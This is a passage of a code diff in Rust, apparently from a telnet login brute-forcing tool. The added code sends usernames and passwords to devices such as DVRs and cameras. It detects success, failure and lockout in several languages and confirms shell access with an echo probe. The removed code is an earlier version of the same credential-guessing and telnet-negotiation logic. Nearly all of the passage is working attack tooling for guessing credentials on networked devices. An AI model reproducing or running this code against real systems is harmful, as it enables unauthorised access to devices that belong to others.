+            || lower.contains("press a key")
+            || lower.contains("any key to continue")
+        {
+            let _ = send_line(&mut stream, "", cfg.read_timeout).await;
+            tokio::time::sleep(Duration::from_millis(300)).await;
+            buf.clear();
+            drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
+        }
+    }
 
-     // Failure indicators - English + Multi-language support
-     vec![
-         // English
-         "incorrect", "failed", "denied", "invalid", "authentication failed",
-     "% authentication", "% bad", "access denied", "login incorrect",
-     "permission denied", "not authorized", "authentication error",
-     "bad password", "wrong password", "authentication failure",
-     "login failed", "invalid login", "invalid password", "invalid username",
-     "bad username", "user unknown", "unknown user", "connection refused",
-     "connection closed", "connection reset", "too many", "maximum",
-     // Spanish
-     "incorrecto", "fallido", "denegado", "inválido", "autenticación fallida",
-     "acceso denegado", "permiso denegado", "no autorizado",
-     // French
-     "incorrect", "échoué", "refusé", "invalide", "authentification échouée",
-     "accès refusé", "permission refusée", "non autorisé",
-     // Portuguese
-     "incorreto", "falhou", "negado", "inválido", "autenticação falhou",
-     "acesso negado", "permissão negada", "não autorizado",
-     // German
-     "falsch", "fehlgeschlagen", "verweigert", "ungültig", "authentifizierung fehlgeschlagen",
-     "zugriff verweigert", "berechtigung verweigert", "nicht autorisiert",
-     // Italian
-     "errato", "fallito", "negato", "non valido", "autenticazione fallita",
-     "accesso negato", "permesso negato", "non autorizzato",
-     // Russian
-     "неправильный", "не удалось", "отказано", "недействительный", "аутентификация не удалась",
-     "доступ запрещен", "разрешение отклонено", "не авторизован",
-     // Chinese
-     "错误", "失败", "拒绝", "无效", "认证失败",
-     "访问被拒绝", "权限被拒绝", "未授权",
-     // Japanese
-     "間違っている", "失敗", "拒否", "無効", "認証失敗",
-     "アクセス拒否", "許可拒否", "未承認",
-     ].iter().map(|s| s.to_string()).collect(),
+    // 3. Classify what the device is asking for
+    let lower = buf.to_lowercase();
+    let wants_login = has_any(&lower, &cfg.login_prompts);
+    let wants_password = has_any(&lower, &cfg.password_prompts);
+
+    if wants_login {
+        // Standard flow: login prompt → send username → wait for password prompt
+        send_line(&mut stream, user, cfg.read_timeout).await?;
+        tokio::time::sleep(Duration::from_millis(150)).await;
+
+        buf.clear();
+        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
+
+        // Some devices echo username before sending password prompt — check again
+        let lower = buf.to_lowercase();
+        if !has_any(&lower, &cfg.password_prompts) && !has_any(&lower, &cfg.failure_indicators) {
+            drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_millis(1500)).await;
+        }
+    } else if wants_password {
+        // Device shows "Password:" immediately (some DVRs/cameras).
+        // Try sending username silently — many accept it before password prompt.
+        // Propagate write errors (don't swallow with let _).
+        send_line(&mut stream, user, cfg.read_timeout).await?;
+        tokio::time::sleep(Duration::from_millis(100)).await;
+        buf.clear();
+        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
+    } else if ends_with_prompt_char(&buf) || !buf.trim().is_empty() {
+        // Got data but no recognized prompt — blind send username
+        send_line(&mut stream, user, cfg.read_timeout).await?;
+        tokio::time::sleep(Duration::from_millis(150)).await;
+        buf.clear();
+        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
+    } else {
+        // No banner at all. Send username directly.
+        send_line(&mut stream, user, cfg.read_timeout).await?;
+        tokio::time::sleep(Duration::from_millis(200)).await;
+        buf.clear();
+        drain_and_negotiate(&mut stream, &mut buf, &mut raw, cfg.read_timeout).await;
+    }
+
+    // 4. Check for early failure / lockout at username stage
+    {
+        let lower = buf.to_lowercase();
+        if has_any(&lower, &cfg.lockout_indicators) {
+            return Err(anyhow!("Rate limited / locked out"));
+        }
+        if has_any(&lower, &cfg.failure_indicators) {
+            return Ok(false);
+        }
+    }
+
+    // 5. Send password
+    send_line(&mut stream, pass, cfg.read_timeout).await?;
+
+    // 6. Read response — use full read_timeout as auth check window
+    buf.clear();
+    let auth_deadline = cfg.read_timeout;
+    let start = tokio::time::Instant::now();
+    let mut saw_eof = false;
+
+    loop {
+        let elapsed = start.elapsed();
+        if elapsed >= auth_deadline {
+            break;
+        }
+        let remaining = auth_deadline - elapsed;
+        let chunk_time = remaining.min(Duration::from_millis(800));
+
+        let n = drain_and_negotiate(&mut stream, &mut buf, &mut raw, chunk_time).await;
+
+        // Classify the accumulated response
+        match classify_response(&buf, cfg) {
+            AuthSignal::Failure | AuthSignal::Reprompt => return Ok(false),
+            AuthSignal::Lockout => return Err(anyhow!("Rate limited / locked out")),
+            AuthSignal::Success => {
+                // Probable success — verify with shell probe
+                return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
+            }
+            AuthSignal::Ambiguous => {}
+        }
+
+        if n == 0 {
+            // Check if the connection was closed (EOF) vs just no data yet
+            match timeout(Duration::from_millis(50), stream.read(&mut [0u8; 1])).await {
+                Ok(Ok(0)) => {
+                    saw_eof = true;
+                    break;
+                }
+                _ => {}
+            }
+            if elapsed > Duration::from_millis(500) {
+                break;
+            }
+        }
+    }
+
+    // 7. Connection closed right after password → almost always auth failure
+    if saw_eof && buf.trim().is_empty() {
+        return Ok(false);
+    }
+
+    // 8. Final heuristic on everything collected
+    match classify_response(&buf, cfg) {
+        AuthSignal::Failure | AuthSignal::Reprompt => return Ok(false),
+        AuthSignal::Lockout => return Err(anyhow!("Rate limited / locked out")),
+        AuthSignal::Success => return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await,
+        AuthSignal::Ambiguous => {}
+    }
+
+    // 9. Last resort: structural prompt analysis on the tail of the buffer
+    if looks_like_shell_prompt(&buf) {
+        return verify_shell(&mut stream, &mut buf, &mut raw, cfg).await;
+    }
+
+    // Ambiguous — no clear signal
+    Ok(false)
+}
+
+/// Classification of auth response.
+enum AuthSignal {
+    Success,
+    Failure,
+    Reprompt,
+    Lockout,
+    Ambiguous,
+}
+
+/// Classify the accumulated response buffer against known indicators.
+/// Checks the full buffer for failure/lockout/reprompt (they appear anywhere),
+/// but only checks the TAIL for success (avoids MOTD false positives).
+fn classify_response(buf: &str, cfg: &TelnetConfig) -> AuthSignal {
+    let lower = buf.to_lowercase();
+
+    // Lockout has highest priority — must signal the engine to pause
+    if has_any(&lower, &cfg.lockout_indicators) {
+        return AuthSignal::Lockout;
+    }
+
+    // Failure indicators — checked against full buffer
+    if has_any(&lower, &cfg.failure_indicators) {
+        return AuthSignal::Failure;
+    }
+
+    // Re-prompt for credentials — device restarted the login cycle
+    if has_any(&lower, &cfg.login_prompts) || has_any(&lower, &cfg.password_prompts) {
+        return AuthSignal::Reprompt;
+    }
+
+    // Success — only check the TAIL of the buffer (last 512 bytes) to avoid
+    // matching MOTD/banner text that happens to contain "welcome" or "login"
+    let tail_start = lower.len().saturating_sub(512);
+    let tail = &lower[tail_start..];
+    if has_any(tail, &cfg.success_indicators) {
+        return AuthSignal::Success;
+    }
+
+    AuthSignal::Ambiguous
+}
+
+/// After success indicators are detected, verify we have a real shell by
+/// sending a probe command and checking for its output.
+/// This eliminates false positives from banners/MOTD containing success words.
+async fn verify_shell(
+    stream: &mut TcpStream,
+    buf: &mut String,
+    raw: &mut [u8],
+    cfg: &TelnetConfig,
+) -> Result<bool> {
+    const PROBE: &str = "echo _RS_VERIFIED_";
+
+    // Send verification command
+    if send_line(stream, PROBE, cfg.read_timeout).await.is_err() {
+        // Write failed — connection dropped before we could send the probe command.
+        // We already matched success indicators before reaching verify_shell(), so the
+        // login likely succeeded and the device closed the connection (some firmware does
+        // this). Returning Ok(true) risks a false positive, but returning Ok(false) would
+        // silently discard a likely-valid credential. We accept the FP risk here because
+        // the caller already passed classification with success indicators.
+        return Ok(true);
+    }
+
+    // Read response (up to 2 seconds)
+    buf.clear();
+    drain_and_negotiate(stream, buf, raw, Duration::from_secs(2)).await;
+
+    // Check for our probe output
+    if buf.contains("_RS_VERIFIED_") {
+        return Ok(true); // Confirmed: we have command execution
+    }
+
+    // Probe might not work on restricted shells, network devices, or busybox without echo.
+    // Check if the response looks like a shell prompt (device accepted the command and re-prompted).
+    let lower = buf.to_lowercase();
+    if has_any(&lower, &cfg.failure_indicators) || has_any(&lower, &cfg.login_prompts) || has_any(&lower, &cfg.password_prompts) {
+        // We got kicked out or re-prompted — the "success" was a false positive
+        return Ok(false);
+    }
+
+    // Got something back (maybe an error from the command, maybe another prompt) — likely success.
+    // The original success indicators already matched, and we didn't get kicked out.
+    if !buf.trim().is_empty() {
+        return Ok(true);
+    }
+
+    // Timeout with no response — assume success since indicators matched before verification
+    Ok(true)
+}
+
+// ============================================================
+// Protocol helpers
+// ============================================================
+
+/// Read from stream, process IAC inline, strip ANSI/control chars,
+/// append clean text to `buf` (bounded to RECENT_BUF_CAP).
+/// Returns count of clean bytes added.
+async fn drain_and_negotiate(
+    stream: &mut TcpStream,
+    buf: &mut String,
+    raw: &mut [u8],
+    read_timeout: Duration,
+) -> usize {
+    let mut total = 0usize;
+    let deadline = tokio::time::Instant::now() + read_timeout;
+
+    loop {
+        let now = tokio::time::Instant::now();
+        if now >= deadline {
+            break;
+        }
+        let remaining = deadline - now;
+
+        match timeout(remaining, stream.read(raw)).await {
+            Ok(Ok(0)) => break,
+            Ok(Ok(n)) => {
+                let (clean, responses) = process_iac(&raw[..n]);
+
+                // Send IAC responses and flush immediately so the server
+                // can proceed with negotiation without waiting.
+                if !responses.is_empty() {
+                    for resp in &responses {
+                        let _ = stream.write_all(resp).await;
+                    }
+                    let _ = stream.flush().await;
+                }
+
+                let text = strip_control_and_ansi(&clean);
+                if !text.is_empty() {
+                    buf.push_str(&text);
+                    if buf.len() > RECENT_BUF_CAP {
+                        let excess = buf.len() - RECENT_BUF_CAP;
+                        buf.drain(..excess);
+                    }
+                    total += text.len();
+                }
+                continue; // try to drain more
+            }
+            _ => break, // read error or timeout
+        }
+    }
+    total
+}
+
+/// Process raw bytes: extract IAC sequences and generate responses.
+/// Returns (clean_data_without_iac, iac_responses_to_send).
+fn process_iac(data: &[u8]) -> (Vec<u8>, Vec<Vec<u8>>) {
+    let mut clean = Vec::with_capacity(data.len());
+    let mut responses: Vec<Vec<u8>> = Vec::new();
+    let mut i = 0;
+
+    while i < data.len() {
+        if data[i] != IAC {
+            clean.push(data[i]);
+            i += 1;
+            continue;
+        }
+        // IAC at end of chunk with no following byte — skip it
+        // (the next read will get the complete IAC sequence)
+        if i + 1 >= data.len() {
+            break;
+        }
+
+        match data[i + 1] {
+            WILL => {
+                if i + 2 < data.len() {
+                    responses.push(negotiate_will(data[i + 2]));
+                    i += 3;
+                } else {
+                    i = data.len();
+                }
+            }
+            DO => {
+                if i + 2 < data.len() {
+                    responses.push(negotiate_do(data[i + 2]));
+                    i += 3;
+                } else {
+                    i = data.len();
+                }
+            }
+            WONT => {
+                // Acknowledge: skip 3 bytes (IAC WONT <option>)
+                i += if i + 2 < data.len() {
+                    3
+                } else {
+                    data.len() - i
+                };
+            }
+            DONT => {
+                i += if i + 2 < data.len() {
+                    3
+                } else {
+                    data.len() - i
+                };
+            }
+            SB => {
+                // Subnegotiation — find IAC SE, possibly respond
+                let sb_start = i + 2;
+                i += 2;
+                while i < data.len() {
+                    if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
+                        // Check if this is a TERMINAL_TYPE SEND request
+                        if sb_start < data.len()
+                            && data[sb_start] == TERMINAL_TYPE
+                            && sb_start + 1 < data.len()
+                            && data[sb_start + 1] == TT_SEND
+                        {
+                            // Respond: IAC SB TERMINAL_TYPE IS "xterm" IAC SE
+                            let mut r = vec![IAC, SB, TERMINAL_TYPE, TT_IS];
+                            r.extend_from_slice(b"xterm");
+                            r.extend_from_slice(&[IAC, SE]);
+                            responses.push(r);
+                        }
+                        i += 2;
+                        break;
+                    }
+                    i += 1;
+                }
+            }
+            IAC => {
+                // Escaped 0xFF literal
+                clean.push(IAC);
+                i += 2;
+            }
+            GA | NOP => {
+                i += 2;
+            }
+            _ => {
+                // Unknown 2-byte command — skip
+                i += 2;
+            }
+        }
+    }
+
+    (clean, responses)
+}
+
+/// Respond to server WILL <option>.
+fn negotiate_will(option: u8) -> Vec<u8> {
+    match option {
+        ECHO | SGA => vec![IAC, DO, option],
+        _ => vec![IAC, DONT, option],
+    }
+}
+
+/// Respond to server DO <option>.
+fn negotiate_do(option: u8) -> Vec<u8> {
+    match option {
+        SGA => vec![IAC, WILL, option],
+        TERMINAL_TYPE => vec![IAC, WILL, option],
+        NAWS => {
+            // Accept and immediately send window size (80x24)
+            let mut r = vec![IAC, WILL, NAWS];
+            r.extend_from_slice(&[IAC, SB, NAWS, 0, 80, 0, 24, IAC, SE]);
+            r
+        }
+        // Refuse everything else: LINEMODE, ECHO, ENVIRON, X_DISPLAY, SPEED, etc.
+        LINEMODE | ECHO | NEW_ENVIRON | ENVIRON | TERMINAL_SPEED | X_DISPLAY_LOCATION => {
+            vec![IAC, WONT, option]
+        }
+        _ => vec![IAC, WONT, option],
+    }
+}
+
+/// Strip ANSI escape sequences AND control characters (except newline/tab).
+fn strip_control_and_ansi(data: &[u8]) -> String {
+    let mut out = Vec::with_capacity(data.len());
+    let mut i = 0;
+
+    while i < data.len() {
+        match data[i] {
+            0x1b => {
+                // ESC — start of escape sequence
+                i += 1;
+                if i >= data.len() {
+                    break;
+                }
+                match data[i] {
+                    b'[' => {
+                        // CSI: ESC [ ... (final byte 0x40-0x7E)
+                        i += 1;
+                        while i < data.len() && !(0x40..=0x7E).contains(&data[i]) {
+                            i += 1;
+                        }
+                        if i < data.len() {
+                            i += 1;
+                        }
+                    }
+                    b']' => {
+                        // OSC: ESC ] ... (terminated by BEL or ST)
+                        i += 1;
+                        while i < data.len() {
+                            if data[i] == 0x07 {
+                                i += 1;
+                                break;
+                            }
+                            if data[i] == 0x1b && i + 1 < data.len() && data[i + 1] == b'\\' {
+                                i += 2;
+                                break;
+                            }
+                            i += 1;
+                        }
+                    }
+                    b'(' | b')' => {
+                        // Charset designation — skip 1 more byte
+                        i += 1;
+                        if i < data.len() {
+                            i += 1;
+                        }
+                    }
+                    _ => {
+                        // Single-char escape (ESC =, ESC >, etc.) — skip it
+                        i += 1;
+                    }
+                }
+            }
+            // C1 control codes (8-bit CSI) — rare but some terminals use 0x9B as CSI
+            0x9b => {
+                i += 1;
+                while i < data.len() && !(0x40..=0x7E).contains(&data[i]) {
+                    i += 1;
+                }
+                if i < data.len() {
+                    i += 1;
+                }
+            }
+            // Control characters to strip: NUL, BEL, BS, DEL, and other C0 noise
+            0x00 | 0x07 | 0x08 | 0x7f => {
+                i += 1;
+            }
+            // C1 range (0x80-0x9F except 0x9B handled above) — strip
+            0x80..=0x9a | 0x9c..=0x9f => {
+                i += 1;
+            }
+            // Keep printable bytes, newlines, tabs, carriage returns
+            _ => {
+                out.push(data[i]);
+                i += 1;
+            }
+        }
+    }
+
+    String::from_utf8_lossy(&out).to_string()
+}
+
+/// Send a line with CR LF (RFC 854 standard line ending).
+async fn send_line(stream: &mut TcpStream, data: &str, write_timeout: Duration) -> Result<()> {
+    let mut buf = Vec::with_capacity(data.len() + 2);
+    buf.extend_from_slice(data.as_bytes());
+    buf.extend_from_slice(b"\r\n");
+
+    timeout(write_timeout, stream.write_all(&buf))
+        .await
+        .map_err(|_| anyhow!("Write timeout"))?
+        .map_err(|e| anyhow!("Write error: {}", e))?;
+
+    let _ = stream.flush().await;
+    Ok(())
+}
+
+/// Check if any needle (lowercase) appears in the haystack (already lowercase).
+fn has_any(haystack: &str, needles: &[String]) -> bool {
+    needles.iter().any(|n| haystack.contains(n.as_str()))
+}
+
+/// Check if text ends with a character commonly used as a prompt indicator.
+fn ends_with_prompt_char(s: &str) -> bool {
+    let trimmed = s.trim_end();
+    matches!(
+        trimmed.as_bytes().last(),
+        Some(b':' | b'>' | b'$' | b'#' | b'%' | b'~')
     )
 }
 
-/// Strip ANSI escape sequences from terminal output for cleaner parsing
-/// Handles CSI sequences like \x1b[31m (colors), \x1b[2J (clear screen), etc.
-#[derive(Debug)]
-enum EofType {
-    CleanClose,      // Server properly closed connection (e.g., logout)
-    AbruptDisconnect, // Connection reset or network error
-    PartialData,     // Got some data then EOF
-}
+/// Heuristic: does the output look like a successful shell prompt?
+///
+/// Examines the last 3 non-empty lines of the buffer. This handles devices
+/// that send a blank line or MOTD after the prompt. Uses structural analysis:
+/// - `user@host:path$` or `user@host:path#` (Linux)
+/// - `hostname>` or `hostname#` (network devices)
+/// - `(config)#` (config mode)
+/// - Short line ending with `$`, `#`, `>`, `~`, `%`
+fn looks_like_shell_prompt(s: &str) -> bool {
+    let candidates: Vec<&str> = s
+        .lines()
+        .rev()
+        .filter(|l| !l.trim().is_empty())
+        .take(3)
+        .collect();
 
-fn classify_eof(response: &str, login_sent: bool, pass_sent: bool, cycle: i32) -> EofType {
-    if response.is_empty() {
-        // No data received before EOF
-        if cycle == 0 {
-            // EOF immediately after connect - not a telnet server
-            EofType::CleanClose
+    for &raw_line in &candidates {
+        let line = raw_line.trim();
+
+        // Prompt lines are short
+        if line.len() > 100 || line.is_empty() {
+            continue;
+        }
+
+        let last_char = match line.chars().last() {
+            Some(c) => c,
+            None => continue,
+        };
+
+        // Must end with a prompt character (with or without trailing space)
+        let effective_last = if last_char == ' ' {
+            line.trim_end().chars().last().unwrap_or('\0')
         } else {
-            // EOF after some cycles - abrupt disconnect
-            EofType::AbruptDisconnect
-        }
-    } else {
-        // Some data received before EOF
-        let response_lower = response.to_lowercase();
+            last_char
+        };
 
-        // Check for clean logout indicators
-        let clean_close_indicators = [
-            "logout", "goodbye", "bye", "closed", "disconnected",
-            "connection closed", "session ended", "logged out"
-        ];
-
-        for indicator in &clean_close_indicators {
-            if response_lower.contains(indicator) {
-                return EofType::CleanClose;
-            }
+        if !matches!(effective_last, '$' | '#' | '>' | '~' | '%') {
+            continue;
         }
 
-        // Check if we got a meaningful response that suggests the connection worked
-        if (login_sent || pass_sent) && response.len() > 10 {
-            EofType::PartialData
-        } else {
-            EofType::AbruptDisconnect
+        let lower = line.to_lowercase();
+
+        // Reject known false positives
+        if [
+            "error",
+            "denied",
+            "fail",
+            "invalid",
+            "refused",
+            "closed",
+            "http/",
+            "html>",
+            "<!doctype",
+            "<html",
+            "not found",
+            "no such",
+            "command not",
+            "syntax error",
+        ]
+        .iter()
+        .any(|fp| lower.contains(fp))
+        {
+            continue;
         }
-    }
-}
 
-fn has_success_indicators(response: &str) -> bool {
-    if response.len() < 5 {
-        return false;
-    }
+        // High-confidence: matches `user@host` pattern (Linux/Unix)
+        if line.contains('@') && (effective_last == '$' || effective_last == '#') {
+            return true;
+        }
 
-    let response_lower = response.to_lowercase();
+        // High-confidence: matches `(something)#` or `(something)>` (network config mode)
+        if line.contains('(') && line.contains(')') && matches!(effective_last, '#' | '>') {
+            return true;
+        }
 
-    // Check for success indicators at the end of response
-    let success_indicators = [
-        "$ ", "# ", "> ", "~ ", "% ", "last login", "welcome",
-        "login successful", "authentication successful", "logged in",
-        "access granted", "successfully", "ok", "accepted",
-        " # ", " ~# ", " /# ", " ~ # ", " / # ", " ~ #", "/ #", "~#", "/#",
-        "built-in shell", "欢迎", "已经登录", "认证成功"
-    ];
-
-    for indicator in &success_indicators {
-        if response_lower.contains(indicator) {
+        // Medium-confidence: short line ending with prompt char, not a sentence
+        // Real prompts don't usually contain spaces (except after hostname)
+        // or if they do, they're very short like "/ # " (busybox)
+        let word_count = line.split_whitespace().count();
+        if word_count <= 4 && line.len() < 50 {
             return true;
         }
     }
@@ -2424,805 +1350,226 @@ fn has_success_indicators(response: &str) -> bool {
     false
 }
 
-fn is_connection_error(error: &std::io::Error) -> bool {
-    use std::io::ErrorKind::*;
-    matches!(error.kind(),
-             ConnectionReset | ConnectionAborted | ConnectionRefused |
-             NetworkUnreachable | HostUnreachable | NetworkDown |
-             BrokenPipe | NotConnected | TimedOut
-    )
-}
-
-/// Telnet IAC (Interpret As Command) constants
-const IAC: u8 = 255;  // 0xFF
-const DONT: u8 = 254; // 0xFE
-const DO: u8 = 253;   // 0xFD
-const WONT: u8 = 252; // 0xFC
-const WILL: u8 = 251; // 0xFB
-const SB: u8 = 250;   // 0xFA - Subnegotiation Begin
-const SE: u8 = 240;   // 0xF0 - Subnegotiation End
-const GA: u8 = 249;   // 0xF9 - Go Ahead
-const EL: u8 = 248;   // 0xF8 - Erase Line
-const EC: u8 = 247;   // 0xF7 - Erase Character
-const AYT: u8 = 246;  // 0xF6 - Are You There
-const AO: u8 = 245;  // 0xF5 - Abort Output
-const IP: u8 = 244;  // 0xF4 - Interrupt Process
-const BREAK: u8 = 243; // 0xF3
-const DM: u8 = 242;   // 0xF2 - Data Mark
-const NOP: u8 = 241;  // 0xF1 - No Operation
-
-/// Telnet option codes
-const ECHO: u8 = 1;
-const SUPPRESS_GO_AHEAD: u8 = 3;
-const TERMINAL_TYPE: u8 = 24;
-const WINDOW_SIZE: u8 = 31;
-const TERMINAL_SPEED: u8 = 32;
-const REMOTE_FLOW_CONTROL: u8 = 33;
-const LINEMODE: u8 = 34;
-const ENVIRONMENT_VARIABLES: u8 = 36;
-
-/// Generate IAC response for option negotiation
-/// Returns bytes to send in response to server option requests
-fn generate_iac_response(cmd: u8, option: u8) -> Vec<u8> {
-    match cmd {
-        DO => {
-            // Server wants us to enable an option
-            // Accept basic options that are safe and commonly used
-            match option {
-                ECHO | SUPPRESS_GO_AHEAD => {
-                    // Accept these as they're standard and safe
-                    vec![IAC, WILL, option]
-                }
-                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
-                    // Refuse advanced options we don't implement
-                    vec![IAC, WONT, option]
-                }
-                _ => {
-                    // Unknown option - refuse it
-                    vec![IAC, WONT, option]
-                }
-            }
-        }
-        DONT => {
-            // Server wants us to disable an option - always comply
-            vec![IAC, WONT, option]
-        }
-        WILL => {
-            // Server wants to enable an option
-            // Accept basic options; refuse advanced ones
-            match option {
-                ECHO | SUPPRESS_GO_AHEAD => {
-                    vec![IAC, DO, option]
-                }
-                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
-                    vec![IAC, DONT, option]
-                }
-                _ => {
-                    vec![IAC, DONT, option]
-                }
-            }
-        }
-        WONT => {
-            // Server refuses an option - acknowledge
-            vec![IAC, DONT, option]
-        }
-        _ => vec![] // Unknown command, no response
+/// Classify error message as retryable.
+fn is_retryable_error(msg: &str) -> bool {
+    let lower = msg.to_lowercase();
+    // Rate limiting / lockout is NOT retryable — the engine should skip this host
+    if lower.contains("rate limit") || lower.contains("locked out") {
+        return false;
     }
+    lower.contains("timeout")
+        || lower.contains("timed out")
+        || lower.contains("connection refused")
+        || lower.contains("connection reset")
+        || lower.contains("broken pipe")
+        || lower.contains("network unreachable")
+        || lower.contains("no route to host")
+        || lower.contains("resource temporarily unavailable")
+        || lower.contains("too many open files")
 }
 
-/// Process Telnet IAC commands and return clean application data
-/// Handles option negotiation (WILL/WONT/DO/DONT) and strips IAC sequences
-/// Returns (clean_data, iac_responses) where iac_responses are bytes to send back
-fn process_telnet_iac(data: &[u8]) -> (Vec<u8>, Vec<u8>) {
-    let mut result = Vec::with_capacity(data.len());
-    let mut iac_responses = Vec::new();
-    let mut i = 0;
+// ============================================================
+// Default prompt / indicator lists (all lowercase for matching)
+// ============================================================
 
-    while i < data.len() {
-        if data[i] == IAC {
-            if i + 1 >= data.len() {
-                // Incomplete IAC sequence, skip
-                break;
-            }
-
-            let cmd = data[i + 1];
-
-            match cmd {
-                IAC => {
-                    // Double IAC means literal 0xFF byte
-                    result.push(IAC);
-                    i += 2;
-                }
-                WILL | WONT | DO | DONT => {
-                    // Option negotiation: IAC [WILL|WONT|DO|DONT] <option>
-                    if i + 2 < data.len() {
-                        let option = data[i + 2];
-                        // Generate appropriate response
-                        let response = generate_iac_response(cmd, option);
-                        iac_responses.extend_from_slice(&response);
-                        i += 3;
-                    } else {
-                        // Incomplete negotiation, skip
-                        break;
-                    }
-                }
-                SB => {
-                    // Subnegotiation: IAC SB <option> <data> IAC SE
-                    // Skip until we find IAC SE
-                    i += 2; // Skip IAC SB
-                    while i < data.len() {
-                        if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
-                            i += 2; // Skip IAC SE
-                            break;
-                        }
-                        i += 1;
-                    }
-                }
-                GA | EL | EC | AYT | AO | IP | BREAK | DM | NOP => {
-                    // Single-byte commands, just skip them
-                    i += 2;
-                }
-                _ => {
-                    // Unknown command, skip IAC and the byte after it
-                    i += 2;
-                }
-            }
-        } else {
-            // Regular data byte
-            result.push(data[i]);
-            i += 1;
-        }
-    }
-
-    (result, iac_responses)
-}
-
-/// Strip ANSI escape sequences from terminal output for cleaner parsing
-/// Handles CSI sequences (\x1b[...), OSC sequences (\x1b]...), and other escape types
-fn strip_ansi_escape_sequences(input: &str) -> String {
-    let mut result = String::with_capacity(input.len());
-    let mut chars = input.chars().peekable();
-    let mut in_escape = false;
-    let mut escape_type = EscapeType::None;
-
-    while let Some(ch) = chars.next() {
-        if ch == '\x1b' {
-            // Start of escape sequence
-            if let Some(next_ch) = chars.peek() {
-                match next_ch {
-                    '[' => {
-                        // CSI sequence: ESC [
-                        chars.next(); // consume '['
-                        in_escape = true;
-                        escape_type = EscapeType::CSI;
-                        continue;
-                    }
-                    ']' => {
-                        // OSC sequence: ESC ]
-                        chars.next(); // consume ']'
-                        in_escape = true;
-                        escape_type = EscapeType::OSC;
-                        continue;
-                    }
-                    '(' | ')' => {
-                        // Character set sequences: ESC ( or ESC )
-                        chars.next(); // consume '(' or ')'
-                        in_escape = true;
-                        escape_type = EscapeType::Charset;
-                        continue;
-                    }
-                    _ => {
-                        // Other escape sequences
-                        in_escape = true;
-                        escape_type = EscapeType::Other;
-                        continue;
-                    }
-                }
-            }
-        }
-
-        if in_escape {
-            // Inside escape sequence - look for sequence terminator based on type
-            let should_end = match escape_type {
-                EscapeType::CSI => {
-                    // CSI ends with a letter, @, `, or {
-                    ch.is_ascii_alphabetic() || ch == '@' || ch == '`' || ch == '{'
-                }
-                EscapeType::OSC => {
-                    // OSC ends with ESC \ (ST - String Terminator) or BEL (0x07)
-                    ch == '\x07' || (ch == '\\' && chars.peek() == Some(&'\x1b'))
-                }
-                EscapeType::Charset => {
-                    // Character set sequences are typically single character
-                    true
-                }
-                EscapeType::Other => {
-                    // For other escapes, look for common terminators
-                    ch.is_ascii_alphabetic() || ch.is_ascii_digit() || ch == '\x07'
-                }
-                EscapeType::None => false,
-            };
-
-            if should_end {
-                let was_osc = escape_type == EscapeType::OSC;
-                in_escape = false;
-                escape_type = EscapeType::None;
-                // For OSC sequences ending with ESC \, consume the \
-                if was_osc && ch == '\\' {
-                    continue;
-                }
-            }
-            // Skip all characters in escape sequence
-            continue;
-        }
-
-        result.push(ch);
-    }
-
-    result
-}
-
-#[derive(Clone, Copy, PartialEq)]
-enum EscapeType {
-    None,
-    CSI,    // Control Sequence Introducer: ESC [
-    OSC,    // Operating System Command: ESC ]
-    Charset,// Character set: ESC ( or ESC )
-    Other,  // Other escape sequences
-}
-
-/// Sanitize user input to prevent format string attacks and display issues
-/// Removes or escapes potentially dangerous characters
-fn sanitize_input(input: &str) -> String {
-    input.chars()
-    .map(|c| {
-        if c.is_control() || c == '%' {
-            '?'
-        } else if c == '\r' || c == '\n' || c == '\t' {
-            ' '
-        } else {
-            c
-        }
-    })
+fn default_login_prompts() -> Vec<String> {
+    [
+        // English
+        "login:",
+        "login :",
+        "username:",
+        "username :",
+        "user:",
+        "user :",
+        "user name:",
+        "user name :",
+        "account:",
+        "login name:",
+        "auth login:",
+        "user id:",
+        "userid:",
+        // German
+        "benutzername:",
+        "anmeldung:",
+        // Spanish
+        "usuario:",
+        "nombre de usuario:",
+        // French
+        "identifiant:",
+        "nom d'utilisateur:",
+        // Portuguese
+        "usu\u{e1}rio:",
+        // Turkish
+        "kullan\u{131}c\u{131} ad\u{131}:",
+        // Russian (transliterated — actual Cyrillic prompts are rare in telnet)
+        "login:",
+        // IoT-specific
+        "dvr login:",
+        "camera login:",
+    ]
+    .iter()
+    .map(|s| s.to_string())
     .collect()
 }
 
-/// Enhanced error classification with specific error types for better debugging
-fn classify_telnet_error(msg: &str) -> &'static str {
-    let lower = msg.to_lowercase();
-
-    // Connection-related errors
-    if lower.contains("connection refused") || lower.contains("connection reset") {
-        "Connection refused/reset"
-    } else if lower.contains("connection aborted") {
-        "Connection aborted"
-    } else if lower.contains("connection closed") || lower.contains("connection abruptly closed") {
-        "Connection closed"
-    } else if lower.contains("connection timeout") || lower.contains("connect timeout") {
-        "Connection timeout"
-    } else if lower.contains("read timeout") || lower.contains("timeout") {
-        "Read timeout"
-    } else if lower.contains("write timeout") {
-        "Write timeout"
-    } else if lower.contains("broken pipe") {
-        "Broken pipe"
-    } else if lower.contains("network unreachable") {
-        "Network unreachable"
-    } else if lower.contains("host unreachable") {
-        "Host unreachable"
-    } else if lower.contains("network down") {
-        "Network down"
-    } else if lower.contains("no route to host") {
-        "No route to host"
-    }
-    // DNS and resolution errors
-    else if lower.contains("cannot resolve") || lower.contains("dns") || lower.contains("name resolution") {
-        "DNS resolution failed"
-    } else if lower.contains("name or service not known") {
-        "Hostname not found"
-    }
-    // Authentication and protocol errors
-    else if lower.contains("authentication failed") || lower.contains("auth failed") {
-        "Authentication failed"
-    } else if lower.contains("authentication error") || lower.contains("auth error") {
-        "Authentication error"
-    } else if lower.contains("login failed") || lower.contains("login incorrect") {
-        "Login failed"
-    } else if lower.contains("access denied") || lower.contains("permission denied") {
-        "Access denied"
